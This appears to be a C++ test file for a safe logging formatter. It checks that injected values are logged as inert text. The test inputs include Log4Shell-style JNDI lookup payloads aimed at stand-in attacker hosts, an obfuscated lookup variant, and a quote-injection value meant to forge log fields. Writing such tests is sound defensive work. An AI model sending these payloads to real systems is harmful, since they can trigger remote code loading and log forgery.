#include "safelog.hpp"

#include <iostream>
#include <string>
#include <string_view>
#include <vector>

namespace {

int g_failures = 0;

void check(bool ok, std::string_view name, std::string_view actual) {
    if (ok) {
        std::cout << "PASS " << name << '\n';
    } else {
        ++g_failures;
        std::cout << "FAIL " << name << "\n  got: " << actual << '\n';
    }
}

void test_placeholder_injection() {
    // Log4Shell-style payload must be recorded as inert text.
    const std::string out =
        safelog::format("login attempt from {}", "${jndi:ldap://evil.example/a}");
    check(out == "login attempt from ${jndi:ldap://evil.example/a}",
          "placeholder_injection_literal", out);

    // A hostile value containing {} must not consume template arguments.
    const std::string out2 = safelog::format("a={} b={}", "x {} y", "second");
    check(out2 == "a=x {} y b=second", "nested_placeholder_not_rescanned", out2);

    // Named/indexed placeholders in the template are not evaluated.
    const std::string out3 = safelog::format("{user} {0} ${jndi:x}", "v");
    check(out3 == "{user} {0} ${jndi:x}", "named_placeholder_not_evaluated", out3);
}

void test_remote_lookup_prefix() {
    const std::string out = safelog::format(
        "ref={}", "jndi:ldap://attacker.invalid:1389/Exploit");
    check(out == "ref=jndi:ldap://attacker.invalid:1389/Exploit",
          "remote_lookup_prefix_is_text", out);

    const std::string out2 =
        safelog::format("{}", "${lower:J}ndi:${lower:L}dap://evil/x");
    check(out2 == "${lower:J}ndi:${lower:L}dap://evil/x",
          "obfuscated_lookup_is_text", out2);
}

void test_overlong_message() {
    safelog::Limits limits;
    limits.max_value_length = 16;
    limits.max_message_length = 64;

    const std::string long_value(100, 'A');
    const std::string out =
        safelog::format("v={}", std::vector<std::string_view>{long_value}, limits);
    check(out == "v=" + std::string(16, 'A') + "...", "value_truncated", out);

    const std::string long_tmpl(500, 'B');
    const std::string out2 = safelog::format(long_tmpl, {}, limits);
    check(out2.size() == 64 && out2.ends_with("...[truncated]"),
          "message_truncated", out2);
}

void test_control_characters() {
    const std::string out =
        safelog::format("{}", std::string_view("a\nb\tc\rd\x01" "e\x7F" "f"));
    check(out == "a\\nb\\tc\\rd\\x01" "e\\x7F" "f", "control_chars_escaped", out);

    // Quotes and backslashes are escaped so values cannot break framing.
    const std::string out2 = safelog::format("{}", "q\"b\\s");
    check(out2 == "q\\\"b\\\\s", "quote_backslash_escaped", out2);

    // Non-ASCII bytes get deterministic hex escapes.
    const std::string out3 = safelog::format("{}", std::string_view("\xC3\xA9"));
    check(out3 == "\\xC3\\xA9", "non_ascii_hex_escaped", out3);
}

void test_legal_arguments() {
    const std::string out =
        safelog::format("user {} did {} on {}", "alice", "read", "doc-7");
    check(out == "user alice did read on doc-7", "legal_args_substituted", out);

    const std::string out2 = safelog::format("{{literal}} {}", "v");
    check(out2 == "{literal} v", "brace_escapes", out2);

    const std::string out3 = safelog::format("no args {}", {});
    check(out3 == "no args {}", "missing_arg_literal", out3);

    const std::string out4 = safelog::format("one {}", "a", "extra");
    check(out4 == "one a", "surplus_arg_ignored", out4);
}

void test_structured_fields() {
    const safelog::Field fields[] = {
        {"user", "alice"},
        {"action", "read\nwrite"},
        {"bad key!", "x"},
        {"target", "jndi:ldap://evil.invalid/a"},
    };
    const std::string out = safelog::format_fields(fields);
    check(out ==
              "user=\"alice\" action=\"read\\nwrite\" bad_key_2=\"x\" "
              "target=\"jndi:ldap://evil.invalid/a\"",
          "structured_fields", out);

    check(safelog::is_valid_key("audit.event_1") &&
              !safelog::is_valid_key("1bad") && !safelog::is_valid_key("a b") &&
              !safelog::is_valid_key("") && !safelog::is_valid_key("a=b"),
          "key_schema", "schema");

    // A value that tries to forge a key stays inside its quotes.
    const safelog::Field evil[] = {{"k", "v\" injected=\"yes"}};
    const std::string out2 = safelog::format_fields(evil);
    check(out2 == "k=\"v\\\" injected=\\\"yes\"", "value_cannot_forge_key", out2);

    const std::string line =
        safelog::format_line("evt {}", {"x"}, std::span<const safelog::Field>(fields));
    check(line ==
              "evt x user=\"alice\" action=\"read\\nwrite\" bad_key_2=\"x\" "
              "target=\"jndi:ldap://evil.invalid/a\"",
          "format_line", line);
}

} // namespace

int main() {
    test_placeholder_injection();
    test_remote_lookup_prefix();
    test_overlong_message();
    test_control_characters();
    test_legal_arguments();
    test_structured_fields();
    if (g_failures != 0) {
        std::cout << g_failures << " test(s) failed\n";
        return 1;
    }
    std::cout << "all tests passed\n";
    return 0;
}
